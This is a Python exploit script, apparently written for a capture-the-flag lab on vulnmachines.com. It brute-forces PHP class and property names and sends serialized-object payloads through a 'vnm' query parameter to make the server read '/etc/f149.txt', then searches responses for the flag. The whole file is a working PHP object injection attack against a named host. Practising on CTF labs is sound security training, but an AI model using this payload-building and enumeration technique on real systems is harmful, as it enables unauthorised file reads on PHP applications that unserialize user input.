#!/usr/bin/env python3
import requests
import urllib.parse

base_url = "http://hackme11.vulnmachines.com:8056"

# Basándome en el artículo, necesito una clase que tenga __destruct o __toString
# Los nombres comunes en CTFs de PHP Object Injection son:

class_names = [
    # Variaciones de FileReader
    "FileReader", "Filereader", "filereader", "FILEREADER",
    "File_Reader", "File_reader", "file_reader",
    
    # Variaciones de ReadFile  
    "ReadFile", "Readfile", "readfile", "READFILE",
    "Read_File", "Read_file", "read_file",
    
    # Variaciones de Logger
    "Logger", "logger", "LOGGER", "Log", "log",
    
    # Nombres específicos del CTF
    "ObjectInjection", "Injection", "Serialize", "Unserialize",
    "PHPObjectInjection", "PHPInjection", "PHPObject",
    
    # Basados en el nombre del lab
    "WhySoSerialize", "SerializeClass", "VulnSerialize",
    "Lab1", "Lab", "Challenge", "CTF",
    
    # Nombres genéricos de archivo
    "FileHandler", "FileManager", "FileSystem",
    "Reader", "Writer", "Handler",
    
    # Basados en el sitio
    "Vulnmachines", "VulnMachines", "SecOps", "TheSecOps",
    "Vuln", "Machine", "VM",
    
    # Nombres comunes en frameworks PHP
    "Application", "App", "Controller", "Model", "View",
    "Request", "Response", "Router", "Route",
    
    # Nombres de ejemplo del artículo
    "Example", "Test", "Demo", "Sample",
    "Foo", "Bar", "Baz",
    
    # Más específicos
    "FlagReader", "FlagGetter", "GetFlag", "ShowFlag",
    "Flag", "FLAG", "flag",
]

print("[*] Bruteforcing class names for Lab 1...")
print(f"[*] Testing {len(class_names)} class names")

for cls in class_names:
    # Probar con diferentes propiedades comunes
    properties = ["file", "filename", "path", "name"]
    
    for prop in properties:
        payload = f'O:{len(cls)}:"{cls}":1:{{s:{len(prop)}:"{prop}";s:13:"/etc/f149.txt";}}'
        encoded = urllib.parse.quote(payload)
        url = f"{base_url}/params?vnm={encoded}"
        
        try:
            response = requests.get(url, timeout=3)
            
            # Buscar indicadores de éxito
            if "vulnmachines{" in response.text.lower():
                print(f"\n[!!!] FLAG FOUND with class: {cls}, property: {prop}")
                print(f"[!!!] Payload: {payload}")
                # Extraer la flag
                import re
                matches = re.findall(r'vulnmachines\{[^}]+\}', response.text, re.IGNORECASE)
                if matches:
                    print(f"[!!!] FLAG: {matches[0]}")
                exit(0)
                
            # Buscar errores diferentes que indiquen que la clase existe
            if "Fatal error" in response.text and cls in response.text:
                print(f"[+] Class {cls} exists! (Fatal error)")
                
            if "Warning" in response.text and cls in response.text and "unserialize" not in response.text:
                print(f"[+] Class {cls} might exist (Warning)")
                
        except:
            pass

print("\n[-] No flag found with standard class names")
print("[*] The class might have a very specific name")